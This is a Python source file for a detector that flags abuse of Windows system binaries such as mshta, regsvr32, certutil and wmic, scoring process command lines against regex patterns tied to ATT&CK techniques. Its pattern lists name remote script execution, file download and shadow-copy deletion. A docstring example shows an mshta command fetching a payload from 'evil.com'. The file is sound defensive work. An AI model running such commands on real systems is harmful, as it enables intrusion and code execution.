"""
shadow313.v4.detection.lolbin_detector
LOLBin (Living-off-the-Land Binary) Detector — T1218

Detects abuse of legitimate Windows binaries to execute malicious code:
- mshta.exe, regsvr32.exe, certutil.exe, wscript.exe, cscript.exe
- rundll32.exe, odbcconf.exe, ieexec.exe, msiexec.exe, installutil.exe
- bitsadmin.exe, wmic.exe, forfiles.exe, pcalua.exe, appsync.exe

ATT&CK: T1218 (System Binary Proxy Execution) and sub-techniques
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional


# ── Known LOLBins with their abuse patterns ───────────────────────────────────

LOLBIN_SIGNATURES: dict[str, dict] = {
    "mshta.exe": {
        "technique": "T1218.005",
        "name": "Mshta",
        "risk": 0.90,
        "suspicious_args": [
            r"http[s]?://",           # remote HTA execution
            r"vbscript:",             # inline VBScript
            r"javascript:",           # inline JavaScript
            r"\.hta\b",              # HTA file execution
            r"about:blank",          # blank page with script
        ],
        "description": "HTML Application Host — executes HTA files and inline scripts",
    },
    "regsvr32.exe": {
        "technique": "T1218.010",
        "name": "Regsvr32",
        "risk": 0.88,
        "suspicious_args": [
            r"/s\s+/u\s+/i:",        # squiblydoo pattern
            r"/i:http",              # remote COM scriptlet
            r"scrobj\.dll",          # script object
            r"\.sct\b",             # scriptlet file
            r"/u\s+/i:",            # unregister with URL
        ],
        "description": "Register Server — Squiblydoo technique for remote code execution",
    },
    "certutil.exe": {
        "technique": "T1218",
        "name": "Certutil",
        "risk": 0.85,
        "suspicious_args": [
            r"-urlcache",            # download file
            r"-decode",              # base64 decode
            r"-encode",              # base64 encode
            r"http[s]?://",          # remote URL
            r"-split",               # split file
            r"-f\s+http",           # force download
        ],
        "description": "Certificate Utility — abused for file download and base64 decode",
    },
    "wscript.exe": {
        "technique": "T1059.005",
        "name": "WScript",
        "risk": 0.82,
        "suspicious_args": [
            r"http[s]?://",          # remote script
            r"\.vbs\b",             # VBScript
            r"\.js\b",              # JScript
            r"//e:vbscript",        # engine specification
            r"//e:jscript",         # engine specification
            r"\\temp\\",            # temp directory execution
            r"\\appdata\\",         # appdata execution
        ],
        "description": "Windows Script Host — executes VBScript and JScript",
    },
    "cscript.exe": {
        "technique": "T1059.005",
        "name": "CScript",
        "risk": 0.80,
        "suspicious_args": [
            r"http[s]?://",
            r"\.vbs\b",
            r"\.js\b",
            r"//e:vbscript",
            r"//e:jscript",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "description": "Console Script Host — command-line VBScript/JScript execution",
    },
    "rundll32.exe": {
        "technique": "T1218.011",
        "name": "Rundll32",
        "risk": 0.85,
        "suspicious_args": [
            r"javascript:",          # JS execution via rundll32
            r"shell32\.dll,control_rundll",  # control panel abuse
            r"url\.dll,fileprotocolhandler", # URL handler abuse
            r"pcwutl\.dll",         # PCW utility
            r"zipfldr\.dll",        # ZIP folder
            r"http[s]?://",         # remote DLL
            r"\\temp\\.*\.dll",     # temp DLL
            r"advpack\.dll.*launchinfsection", # INF execution
        ],
        "description": "Run DLL — executes DLL exports, abused for code execution",
    },
    "odbcconf.exe": {
        "technique": "T1218.008",
        "name": "Odbcconf",
        "risk": 0.87,
        "suspicious_args": [
            r"/a\s*\{regsvr",       # register DLL
            r"\.dll\b",             # DLL loading
            r"http[s]?://",         # remote resource
            r"\\temp\\",            # temp execution
        ],
        "description": "ODBC Configuration — abused to load arbitrary DLLs",
    },
    "msiexec.exe": {
        "technique": "T1218.007",
        "name": "Msiexec",
        "risk": 0.83,
        "suspicious_args": [
            r"/q.*http[s]?://",     # quiet remote install
            r"http[s]?://.*\.msi",  # remote MSI
            r"/i\s+http",           # install from URL
            r"\\temp\\.*\.msi",     # temp MSI
        ],
        "description": "Windows Installer — abused for remote MSI execution",
    },
    "installutil.exe": {
        "technique": "T1218.004",
        "name": "InstallUtil",
        "risk": 0.88,
        "suspicious_args": [
            r"/logfile=",           # log suppression
            r"/logtoconsole=false", # console suppression
            r"\.dll\b",             # DLL execution
            r"\.exe\b",             # EXE execution
        ],
        "description": ".NET InstallUtil — executes arbitrary .NET assemblies",
    },
    "bitsadmin.exe": {
        "technique": "T1197",
        "name": "BITSAdmin",
        "risk": 0.80,
        "suspicious_args": [
            r"/transfer",           # file transfer
            r"http[s]?://",         # remote download
            r"/addfile.*http",      # add remote file
            r"/setnotifycmdline",   # execute on completion
        ],
        "description": "BITS Admin — abused for file download and persistence",
    },
    "wmic.exe": {
        "technique": "T1047",
        "name": "WMIC",
        "risk": 0.82,
        "suspicious_args": [
            r"process\s+call\s+create", # process creation
            r"os\s+get",            # OS enumeration
            r"shadowcopy\s+delete", # shadow copy deletion
            r"http[s]?://",         # remote XSL
            r"/format:.*http",      # remote format file
        ],
        "description": "WMI Command-line — process creation and remote execution",
    },
    "forfiles.exe": {
        "technique": "T1218",
        "name": "Forfiles",
        "risk": 0.78,
        "suspicious_args": [
            r"/c\s+cmd",            # cmd execution
            r"/c\s+powershell",     # PowerShell execution
            r"/c\s+mshta",          # mshta execution
            r"0x",                  # hex encoded command
        ],
        "description": "ForFiles — batch processing abused for command execution",
    },
}

# Parent processes that should NOT spawn LOLBins
SUSPICIOUS_PARENT_PROCESSES = {
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "acrord32.exe", "foxit.exe", "chrome.exe", "firefox.exe",
    "iexplore.exe", "msedge.exe", "teams.exe", "slack.exe",
}

# Legitimate parent processes (lower suspicion)
LEGITIMATE_PARENTS = {
    "explorer.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
    "services.exe", "svchost.exe", "mmc.exe", "taskeng.exe",
}


@dataclass
class LOLBinAlert:
    """Alert generated when a LOLBin abuse pattern is detected."""
    lolbin:          str
    technique:       str
    technique_name:  str
    risk_score:      float
    command_line:    str
    parent_process:  str
    matched_pattern: str
    description:     str
    severity:        str
    timestamp:       str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    recommendations: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "lolbin":          self.lolbin,
            "technique":       self.technique,
            "technique_name":  self.technique_name,
            "risk_score":      self.risk_score,
            "command_line":    self.command_line[:200],
            "parent_process":  self.parent_process,
            "matched_pattern": self.matched_pattern,
            "description":     self.description,
            "severity":        self.severity,
            "timestamp":       self.timestamp,
            "recommendations": self.recommendations,
        }


class LOLBinDetector:
    """
    Detects Living-off-the-Land Binary (LOLBin) abuse.

    Covers T1218 and sub-techniques:
    - T1218.005 Mshta
    - T1218.010 Regsvr32
    - T1218.011 Rundll32
    - T1218.008 Odbcconf
    - T1218.007 Msiexec
    - T1218.004 InstallUtil
    - T1197 BITSAdmin
    - T1047 WMIC
    - T1059.005 WScript/CScript

    Usage:
        detector = LOLBinDetector()
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/payload.hta",
            "parent_process": "winword.exe",
        })
    """

    # Risk boost when spawned from suspicious parent
    SUSPICIOUS_PARENT_BOOST = 0.15

    # Risk boost when command contains encoded content
    ENCODING_BOOST = 0.10

    def __init__(self):
        self._alerts: list[LOLBinAlert] = []
        self._compiled: dict[str, list] = {}
        self._compile_patterns()

    def _compile_patterns(self) -> None:
        """Pre-compile all regex patterns for performance."""
        for lolbin, sig in LOLBIN_SIGNATURES.items():
            self._compiled[lolbin] = [
                re.compile(pat, re.IGNORECASE)
                for pat in sig["suspicious_args"]
            ]

    def analyze_event(self, event: dict) -> Optional[LOLBinAlert]:
        """
        Analyze a single process creation event for LOLBin abuse.

        Args:
            event: dict with keys:
                - process_name: str (e.g., "mshta.exe")
                - command_line: str (full command line)
                - parent_process: str (parent process name)
                - user: str (optional)
                - host: str (optional)

        Returns:
            LOLBinAlert if suspicious, None if clean
        """
        process_name = event.get("process_name", "").lower()
        command_line  = event.get("command_line", "")
        parent_process = event.get("parent_process", "").lower()

        # Check if this is a known LOLBin
        lolbin_key = None
        for key in LOLBIN_SIGNATURES:
            if key in process_name or process_name == key:
                lolbin_key = key
                break

        if not lolbin_key:
            return None

        sig = LOLBIN_SIGNATURES[lolbin_key]
        patterns = self._compiled[lolbin_key]

        # Check for suspicious argument patterns
        matched_pattern = None
        for i, pattern in enumerate(patterns):
            if pattern.search(command_line):
                matched_pattern = sig["suspicious_args"][i]
                break

        if not matched_pattern:
            return None

        # Calculate risk score
        risk = sig["risk"]

        # Boost if spawned from suspicious parent (Office, browser, etc.)
        if any(susp in parent_process for susp in SUSPICIOUS_PARENT_PROCESSES):
            risk = min(1.0, risk + self.SUSPICIOUS_PARENT_BOOST)

        # Boost if command contains encoding indicators
        encoding_indicators = ["base64", "frombase64", "-enc", "-encodedcommand",
                               "0x", "chr(", "charcode"]
        if any(ind in command_line.lower() for ind in encoding_indicators):
            risk = min(1.0, risk + self.ENCODING_BOOST)

        # Determine severity
        if risk >= 0.90:
            severity = "CRITICAL"
        elif risk >= 0.80:
            severity = "HIGH"
        elif risk >= 0.65:
            severity = "MEDIUM"
        else:
            severity = "LOW"

        # Build recommendations
        recommendations = [
            f"Investigate {lolbin_key} execution from {parent_process}",
            f"Check command line for malicious payload: {command_line[:100]}",
            "Review process tree for lateral movement indicators",
            f"ATT&CK technique: {sig['technique']} — {sig['name']}",
        ]
        if any(susp in parent_process for susp in SUSPICIOUS_PARENT_PROCESSES):
            recommendations.insert(0,
                f"⚠️ HIGH RISK: {lolbin_key} spawned from {parent_process} — "
                f"likely macro/exploit execution"
            )

        alert = LOLBinAlert(
            lolbin          = lolbin_key,
            technique       = sig["technique"],
            technique_name  = sig["name"],
            risk_score      = round(risk, 3),
            command_line    = command_line,
            parent_process  = parent_process,
            matched_pattern = matched_pattern,
            description     = sig["description"],
            severity        = severity,
            recommendations = recommendations,
        )

        self._alerts.append(alert)
        return alert

    def analyze_batch(self, events: list[dict]) -> list[LOLBinAlert]:
        """Analyze multiple events and return all alerts."""
        alerts = []
        for event in events:
            alert = self.analyze_event(event)
            if alert:
                alerts.append(alert)
        return alerts

    def get_alerts(self) -> list[LOLBinAlert]:
        """Return all alerts generated so far."""
        return list(self._alerts)

    def get_stats(self) -> dict:
        """Return detection statistics."""
        by_technique: dict[str, int] = {}
        by_severity: dict[str, int] = {}
        for a in self._alerts:
            by_technique[a.technique] = by_technique.get(a.technique, 0) + 1
            by_severity[a.severity]   = by_severity.get(a.severity, 0) + 1
        return {
            "total_alerts":  len(self._alerts),
            "by_technique":  by_technique,
            "by_severity":   by_severity,
            "lolbins_seen":  list({a.lolbin for a in self._alerts}),
        }

    def clear(self) -> None:
        """Clear all stored alerts."""
        self._alerts.clear()

    @staticmethod
    def list_lolbins() -> list[str]:
        """Return list of all monitored LOLBins."""
        return list(LOLBIN_SIGNATURES.keys())

    @staticmethod
    def get_technique(lolbin: str) -> Optional[str]:
        """Get ATT&CK technique ID for a LOLBin."""
        sig = LOLBIN_SIGNATURES.get(lolbin.lower())
        return sig["technique"] if sig else None